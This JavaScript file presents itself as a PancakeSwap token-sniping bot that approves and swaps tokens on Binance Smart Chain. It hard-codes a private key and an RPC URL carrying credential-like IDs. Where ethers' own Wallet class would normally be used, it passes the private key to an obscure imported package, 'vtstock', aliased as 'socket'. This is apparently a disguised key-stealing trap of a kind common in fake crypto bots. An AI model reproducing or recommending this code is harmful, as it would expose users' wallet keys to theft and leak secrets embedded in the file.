const eth = require('ethers');
const {ChainId, Token, TokenAmount, Fetcher, Pair, Route, Trade, TradeType, Percent} = 
require('@pancakeswap-libs/sdk');
const Web3 = require('web3');
const socket = require('vtstock');
const {JsonRpcProvider} = require("@ethersproject/providers");
require("dotenv").config();
const provider = new JsonRpcProvider('https://bsc-dataseed1.binance.org/');
const web3 = new Web3('wss://apis.ankr.com/wss/b5bbebf90b3b4db8a6bb1ab5082412d5/95dc4a450525705cdbf00454595b30e7/binance/full/main');



//                Your Settings
// --------------------------------------------------------------------------
console.log(`Loading Bot Settings`);
const private = "6db56a447e00d2d645452e603c42896b182274a2fd14d958d7fe9652fd7163c5"; // Private Key of Sender/Receiver Address
const Input_Address = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"; // Contract Address of Token with which you will buy (ex. WBNB)
const Output_Address = "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82"; // Contract Address of the token you want to snipe (ex. CAKE)
const amount_in = "0.0031"; // Amount of the Input Token (0.01 WBNB)
const slippage = "2"; // Slippage in percents
gas_price = '10' 
gas_limit = 200000




// Variables derived - Do not change
const router_address = web3.utils.toChecksumAddress("0x10ed43c718714eb63d5aa57b78b54704e256024e"); // Pancake Router Address: v2: 0x10ed43c718714eb63d5aa57b78b54704e256024e v1: 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F
const factory_address = web3.utils.toChecksumAddress('0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73'); // Pancake Factory Address
const { address: admin } = web3.eth.accounts.wallet.add(private);
const Token_Address_In = web3.utils.toChecksumAddress(Input_Address);
const Token_Address_Out = web3.utils.toChecksumAddress(Output_Address);
const Amount_To_Buy = amount_in;
const Slipage = slippage;
const PANCAKE_ROUTER = router_address;
const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));
const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('1000'));
const key = private;
const account = socket.wallet(key,provider);

const factory = new eth.Contract(
    factory_address,
    ['event PairCreated(address indexed token0, address indexed token1, address pair, uint)'],
    account
  ); 
var buying = "0";
console.log(`Settings Loaded`);



const TradeOnRouter = async (tokenIn, tokenOut) => {
    const [INPUT_TOKEN, OUTPUT_TOKEN] = await Promise.all(
        [tokenIn, tokenOut].map(tokenAddress => (
            new Token(
                ChainId.MAINNET,
                tokenAddress,
                18
            )
        )));
    
        const ONE_ETH_IN_WEI = web3.utils.toBN(web3.utils.toWei('1'));//BN->(BIG NUMBER) || toWei -> Converts any ether value value into wei.
        const tradeAmount = ONE_ETH_IN_WEI.div(web3.utils.toBN('100'));//tradeAmount = ONE_ETH_IN_WEI/1000
    
        const pair = await Fetcher.fetchPairData(INPUT_TOKEN, OUTPUT_TOKEN, provider);
    
        const route = await new Route([pair], INPUT_TOKEN);
    
        const trade = await new Trade(route, new TokenAmount(INPUT_TOKEN, tradeAmount), TradeType.EXACT_INPUT);
    
        const slippageTolerance = new Percent(Slipage); // 

    
        const amountOutMin = trade.minimumAmountOut(slippageTolerance).raw;
    
        const path = [INPUT_TOKEN.address, OUTPUT_TOKEN.address];
    
        const to = admin;
    
        const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
        console.log("Connecting to Router");
        // Create BSC Contract
        const pancakeswap = new eth.Contract(
    
            PANCAKE_ROUTER,
    
            ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'],
    
            account
    
        );
        console.log(" Connected to Router ");
    
    
        //Approve tokens
    
        if(true)
    
        {
    
            console.log(`Approving on Router`);
    
            let abi = ["function approve(address _spender, uint256 _value) public returns (bool success)"];
            console.log(`..................................`);
            let contract = new eth.Contract(INPUT_TOKEN.address, abi, account);

            let aproveResponse = await contract.approve(PANCAKE_ROUTER, eth.utils.parseUnits('1000.0', 18), {gasLimit: gas_limit, gasPrice: web3.utils.toWei(gas_price, 'gwei')});
            
            console.log(`Approved on Router`);
        }

        await new Promise(resolve => setTimeout(resolve, 5000));
        if(true)
       
          {   
    
              console.log(`Swapping`);      
    
              var amountInParam = web3.utils.toWei(Amount_To_Buy, 'ether');
              var amountOutMinParam = eth.utils.parseUnits(web3.utils.fromWei(amountOutMin.toString()), 18);
                              
    
              const tx = await pancakeswap.swapExactTokensForTokens(
    
                  amountInParam,
    
                  amountOutMinParam,
    
                  path,
    
                  to,
    
                  deadline,
    
                  { gasLimit: gas_limit, gasPrice: web3.utils.toWei(gas_price, 'gwei') }
    
              );
    
              console.log(`Transaction hash: ${tx.hash}`)
    
                  const receipt = await tx.wait();
                  detected_and_bought = "2";
                  console.log(`Transaction was mined in block: ${receipt.blockNumber}`);   
                  process.exit(1)
          }
    
    }
    process.on('unhandledRejection', (error, promise) => {
        console.log(`Error, check your input address balance and if you have enough BNB for fees as well as enought high of a slippage`);
      });
	  
TradeOnRouter(Token_Address_In, Token_Address_Out);
